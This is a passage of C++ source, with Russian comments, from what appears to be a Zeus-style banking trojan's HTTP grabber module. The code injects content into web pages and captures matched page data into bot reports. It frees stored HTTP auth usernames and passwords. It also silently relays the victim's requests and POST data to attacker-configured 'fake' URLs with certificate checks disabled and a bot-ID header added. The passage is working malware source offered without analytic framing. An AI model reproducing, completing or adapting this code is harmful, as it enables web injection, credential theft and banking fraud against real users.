        if(newBuf != NULL) //Не обращаем внимание на ошибку.
        {
          Mem::_copy(newBuf,                                  *context,                                           offsetBegin);
          Mem::_copy(newBuf + offsetBegin,                    (LPBYTE)blockNew + sizeof(HttpInject::INJECTBLOCK), blockNewDataSize);
          Mem::_copy(newBuf + offsetBegin + blockNewDataSize, *context + offsetEnd,                               *contextSize - offsetEnd);

          Mem::free(*context);
          *context     = newBuf;
          *contextSize = newSize;

          changesCount++;
        }
      }
      //Сохранение.
      else if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
      {
        if(Mem::reallocEx(&grabbedData, grabbedDataSize + blockNewDataSize + matchedDataSize + 1/*\n*/ + 1/*\0*/)) //Не обращаем внимание на ошибку.
        {
          if(blockNewDataSize > 0)
          {
            Mem::_copy(grabbedData + grabbedDataSize, (LPBYTE)blockNew + sizeof(HttpInject::INJECTBLOCK), blockNewDataSize);
            grabbedDataSize += blockNewDataSize;
          }
          Mem::_copy(grabbedData + grabbedDataSize, *context + offsetBegin, matchedDataSize);

          if(curData->flags & HttpInject::FLAG_CAPTURE_NOTPARSE)grabbedDataSize += matchedDataSize;
          else grabbedDataSize += HttpTools::_removeTagsA((LPSTR)grabbedData + grabbedDataSize, matchedDataSize);

          grabbedData[grabbedDataSize++] = '\n';
          grabbedData[grabbedDataSize]   = 0;
        }
      }
    }

    //Пишим награбленное.
    if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
    {
      /*if(grabbedData == NULL)
      {
        grabbedDataSize = 35;
        grabbedData     = (LPBYTE)Str::_CopyExA("*NO MATCHES FOUND FOR CURRENT MASK*", grabbedDataSize);
      }*/

      if(grabbedData != NULL)
      {
        if(curData->flags & HttpInject::FLAG_CAPTURE_TOFILE)
        {
          char host[260];
          URL_COMPONENTSA uc;

          Mem::_zero(&uc, sizeof(URL_COMPONENTSA));
          uc.dwStructSize     = sizeof(URL_COMPONENTSA);
          uc.lpszHostName     = host;
          uc.dwHostNameLength = sizeof(host) / sizeof(char) - 1;

          if(CWA(wininet, InternetCrackUrlA)(url, 0, 0, &uc) == TRUE && uc.dwHostNameLength > 0)
          {
            WCHAR file[MAX_PATH];
            SYSTEMTIME st;
            
            CWA(kernel32, GetSystemTime)(&st);            
            CSTR_GETW(decodedString, httpgrabber_inject_path_format);
            Str::_sprintfW(file, sizeof(file) / sizeof(WCHAR), decodedString, host, st.wYear - 2000, st.wMonth, st.wDay);
            Report::writeData(BLT_FILE, NULL, file, grabbedData, grabbedDataSize);
          }
        }
        else
        {
          LPWSTR urlW = Str::_ansiToUnicodeEx(url, -1);
          if(urlW != NULL)
          {
            CSTR_GETW(decodedString, httpgrabber_inject_grabbed_format);
            Report::writeStringFormat(BLT_GRABBED_HTTP, urlW, NULL, decodedString, urlW, grabbedData);
            Mem::free(urlW);
          }
        }
        Mem::free(grabbedData);
      }
    }

    if(curData->blockOnUrl != NULL)
    {
      //Суточное ограничение.
      if(curData->flags & HttpInject::FLAG_ONCE_PER_DAY)
      {
        WCHAR key[CORE_REGISTRY_KEY_BUFFER_SIZE];
        WCHAR value[max(CORE_REGISTRY_VALUE_BUFFER_SIZE, (MD5HASH_SIZE * 2 + 1))];
        Core::getRegistryValue(Core::RV_LOCALCONFIG, key, value);

        //Получаем хэш.
        BYTE hash[MD5HASH_SIZE];
        if(Crypt::_md5Hash(hash, curData->blockOnUrl, Str::_LengthA(curData->blockOnUrl)))
        {
          Str::_toHexW(hash, MD5HASH_SIZE, value);

          //Ставим значение.
          SYSTEMTIME curTime;
          CWA(kernel32, GetLocalTime)(&curTime);
          Registry::_setValueAsBinary(HKEY_CURRENT_USER, key, value, REG_BINARY, &curTime, sizeof(SYSTEMTIME));
        }
      }
      //Обычная блокировка.
      else
      {
#       if defined WDEBUG1
        WDEBUG1(WDDT_INFO, "Wating for blocking url [%S].", curData->blockOnUrl);
#       endif        
        
        CWA(kernel32, EnterCriticalSection)(&blockInjectInfo.cs);
        Mem::free(blockInjectInfo.urlMaskForBlock);
        Mem::free(blockInjectInfo.blockOnUrl);
        blockInjectInfo.urlMaskForBlock =  Str::_CopyExA(curData->urlMask, -1);
        blockInjectInfo.blockOnUrl      =  Str::_CopyExA(curData->blockOnUrl, -1);
        CWA(kernel32, LeaveCriticalSection)(&blockInjectInfo.cs);
      }
    }
  }

  return (changesCount > 0);
}

bool HttpGrabber::_isFakeData(INJECTFULLDATA *dataList, DWORD count)
{
  return (count == 1 && dataList->flags & (HttpInject::FLAG_IS_FAKE | HttpInject::FLAG_IS_MIRRORFAKE));
}

void HttpGrabber::_freeRequestData(REQUESTDATA *requestData)
{
  Mem::free(requestData->url);
  Mem::free(requestData->referer);
  Mem::free(requestData->contentType);
  Mem::free(requestData->authorizationData.userName);
  Mem::free(requestData->authorizationData.password);
  Mem::free(requestData->authorizationData.unknownType);
  Mem::free(requestData->dynamicConfig);
  Mem::free(requestData->localConfig);
}

void HttpGrabber::_freeInjectFullData(INJECTFULLDATA *data)
{
  Mem::free(data->urlMask);
  Mem::free(data->fakeUrl);
  Mem::free(data->blockOnUrl);
  Mem::free(data->contextMask);
  Mem::free(data->injects);
}

void HttpGrabber::_freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count)
{
  while(count--)_freeInjectFullData(&dataList[count]);
  Mem::free(dataList);
}

//Данные для фейка.
typedef struct
{
  HttpGrabber::REQUESTDATA *requestData;
  LPSTR fakeUrl;
  HINTERNET fakeRequest;
}FAKECONNECT;

/*
  Создание запроса к фейк-URL.

  IN requestData - данные запроса.
  IN faketUrl    - фейк-URL.
  IN verb        - GET/POST.

  Return         - хэндл запроса, NULL - в случаи ошибки.
*/
static DWORD WINAPI fakeConnectProc(void *p)
{
  CoreHook::disableFileHookerForCurrentThread(true);
  FAKECONNECT *fc = (FAKECONNECT *)p;
  
  //Парсим URL.
  HttpTools::URLDATA urlData;
  if(HttpTools::_parseUrl(fc->fakeUrl, &urlData))
  {
    //Соединяемся.
    HINTERNET fakeInternet = CWA(wininet, InternetOpenA)(coreData.httpUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if(fakeInternet != NULL)
    {
      HINTERNET fakeConnect = CWA(wininet, InternetConnectA)(fakeInternet, urlData.host, urlData.port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
      if(fakeConnect != NULL)
      {
        HINTERNET fakeRequest = CWA(wininet, HttpOpenRequestA)(fakeConnect,
                                                               fc->requestData->verb == HttpGrabber::VERB_POST ? "POST" : "GET",
                                                               urlData.uri,
                                                               "HTTP/1.1",
                                                               fc->requestData->url,
                                                               NULL,
                                                               INTERNET_FLAG_HYPERLINK |
                                                               INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                                                               INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                                                               INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
                                                               INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
                                                               INTERNET_FLAG_NO_AUTH |
                                                               INTERNET_FLAG_NO_CACHE_WRITE |
                                                               INTERNET_FLAG_NO_UI |
                                                               INTERNET_FLAG_PRAGMA_NOCACHE |
                                                               INTERNET_FLAG_RELOAD |
                                                               (urlData.scheme == HttpTools::UDS_HTTPS ? INTERNET_FLAG_SECURE : 0),
                                                               NULL);

        if(fakeRequest != NULL)
        {
          //Добавляем заголовоки.
          {
            LPSTR header;

            PESETTINGS pes;
            Core::getPeSettings(&pes);

            //Content-Type.
            {
              CSTR_GETA(ct, httpgrabber_request_ct);
              if(fc->requestData->contentTypeSize > 0 && Str::_sprintfExA(&header, ct, fc->requestData->contentType) > 0)
              {
                CWA(wininet, HttpAddRequestHeadersA)(fakeRequest, header, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
                Mem::free(header);
              }
            }

            //ZCID.
            {
              CSTR_GETA(zcid, httpgrabber_request_zcid);
              LPWSTR encodedCompId = HttpTools::_urlEncodeExW(pes.compId, Str::_LengthW(pes.compId));
              if(encodedCompId != NULL && Str::_sprintfExA(&header, zcid, encodedCompId) > 0)
              {
                CWA(wininet, HttpAddRequestHeadersA)(fakeRequest, header, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
                Mem::free(header);
              }
              Mem::free(encodedCompId);          
            }
          }

          //Отправляем запрос.
          if(CWA(wininet, HttpSendRequestA)(fakeRequest, NULL, 0, fc->requestData->postData, fc->requestData->postDataSize) == TRUE)
          {
            DWORD size   = sizeof(DWORD);
            DWORD status = 0;

            if(CWA(wininet, HttpQueryInfoA)(fakeRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &status, &size, NULL) == TRUE && status == HTTP_STATUS_OK)
            {
              LPSTR newUrl = (LPSTR)Wininet::_queryOptionExA(fakeRequest, INTERNET_OPTION_URL, &size);
              if(newUrl != NULL)
              {
                //FIXME: TryUseURLMask(newUrl, size);
                Mem::free(newUrl);
              }

              HttpTools::_freeUrlData(&urlData);
              fc->fakeRequest = fakeRequest;
              return 0;
            }
          }
          CWA(wininet, InternetCloseHandle)(fakeRequest);
        }        
        CWA(wininet, InternetCloseHandle)(fakeConnect);
      }
      CWA(wininet, InternetCloseHandle)(fakeInternet);
    }    
    HttpTools::_freeUrlData(&urlData);
  }
  return 0;
}

HINTERNET HttpGrabber::_createFakeResponse(REQUESTDATA *requestData, INJECTFULLDATA *fakeData)
{
  //Генерируем URL фейка.
  FAKECONNECT fakeConnect;
  fakeConnect.requestData = requestData;
  fakeConnect.fakeRequest = NULL;

  if(fakeData->flags & HttpInject::FLAG_IS_MIRRORFAKE)fakeConnect.fakeUrl = _genarateMirrorFakeUrlA(fakeData->fakeUrl, requestData->url, fakeData->urlMask);
  else fakeConnect.fakeUrl = HttpTools::_catExtraInfoFromUrlToUrlA(requestData->url, fakeData->fakeUrl);

# if defined WDEBUG1
  WDEBUG1(WDDT_INFO, "fakeConnect.fakeUrl=[%S].", fakeConnect.fakeUrl);
# endif
  
  //Вызываем поток для прозрачного подключения.
  if(fakeConnect.fakeUrl != NULL)
  {
    Core::initHttpUserAgent(); //Нужно вызвать здесь, т.к. вызов в другом потоке приведет к deadlock.

#   if defined WDEBUG0
    WDEBUG0(WDDT_INFO, "Sending request to fake.");
#   endif

    HANDLE fakeThread = CWA(kernel32, CreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)fakeConnectProc, &fakeConnect, 0, NULL);
    if(fakeThread != NULL)
    {
      Sync::_waitForMultipleObjectsAndDispatchMessages(1, &fakeThread, false, INFINITE);
      CWA(kernel32, CloseHandle)(fakeThread);
    }

#   if defined WDEBUG0
    WDEBUG0(WDDT_INFO, "Request sended.");
#   endif    
    
    Mem::free(fakeConnect.fakeUrl);
  }
  
  //Проверяем результат.
# if(BO_DEBUG > 0 && defined WDEBUG)
  if(fakeConnect.fakeRequest == NULL)WDEBUG0(WDDT_ERROR, "Failed to create fake request.");
# endif  

  return fakeConnect.fakeRequest;
}
